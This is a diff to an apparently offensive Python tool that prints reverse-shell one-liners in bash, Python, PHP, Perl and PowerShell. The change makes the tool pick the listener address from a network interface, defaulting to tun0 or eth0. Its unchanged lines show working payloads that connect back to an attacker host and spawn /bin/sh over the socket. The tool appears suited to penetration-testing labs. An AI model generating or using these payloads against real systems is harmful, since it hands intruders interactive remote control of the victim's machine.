@@ -2,13 +2,10 @@
 
 import sys
 import base64
-
 import netifaces as ni
 
-TUN0_IP = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
-
 def usage():
-    print("Usage: {} -t <shell_type> -i <LHOST> -p <LPORT>".format(sys.argv[0]))
+    print("Usage: {} [-t <shell_type>] [-i <INTERFACE>] [-p <LPORT>]".format(sys.argv[0]))
     sys.exit(1)
 
 def generate_bash(LHOST, LPORT):
@@ -35,7 +32,7 @@ python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{}\",{}));[os.du
 
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'
 
-python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'
 """.format(LHOST, LPORT, LHOST, LPORT, LHOST, LPORT)
 
 def generate_php(LHOST, LPORT):
@@ -51,7 +48,6 @@ def generate_perl(LHOST, LPORT):
 [+ PERL]
 perl -e 'use Socket;$i="{}";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'
 """.format(LHOST, LPORT)
-
 
 def generate_powershell(LHOST, LPORT):
     header = """
@@ -82,16 +78,17 @@ def generate_payloads(LHOST, LPORT, shell_type):
         'ps': generate_powershell(LHOST, LPORT)
     }
     if shell_type != "all":
-      return payloads.get(shell_type, "Invalid shell type")
+        return payloads.get(shell_type, "Invalid shell type")
     for shell_type in payloads.keys():
-      output += payloads.get(shell_type, "Invalid shell type")
+        output += payloads.get(shell_type, "Invalid shell type")
     return output
 
 if __name__ == "__main__":
     # Initialize default values
-    LHOST = TUN0_IP
+    LHOST = None
     LPORT = 80
     shell_type = "all"
+    interface = None
 
     # Parse the command-line arguments
     i = 1
@@ -100,13 +97,32 @@ if __name__ == "__main__":
             shell_type = sys.argv[i + 1]
             i += 2
         elif sys.argv[i] == '-i':
-            LHOST = sys.argv[i + 1]
+            interface = sys.argv[i + 1]
             i += 2
         elif sys.argv[i] == '-p':
             LPORT = int(sys.argv[i + 1])
             i += 2
         else:
             usage()
+
+    # Determine the LHOST based on the interface
+    if interface:
+        if interface in ni.interfaces():
+            LHOST = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']
+            print(f"Using IP address {LHOST} from interface {interface}")
+        else:
+            print(f"Interface '{interface}' does not exist.")
+            sys.exit(1)
+    else:
+        if 'tun0' in ni.interfaces():
+            LHOST = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
+            print(f"Using IP address {LHOST} from interface tun0")
+        elif 'eth0' in ni.interfaces():
+            LHOST = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
+            print(f"Using IP address {LHOST} from interface eth0")
+        else:
+            print("No valid interface found (tun0 or eth0). Please specify an interface using the -i flag.")
+            sys.exit(1)
 
     # Generate and print payloads based on the given parameters
     payload = generate_payloads(LHOST, LPORT, shell_type)
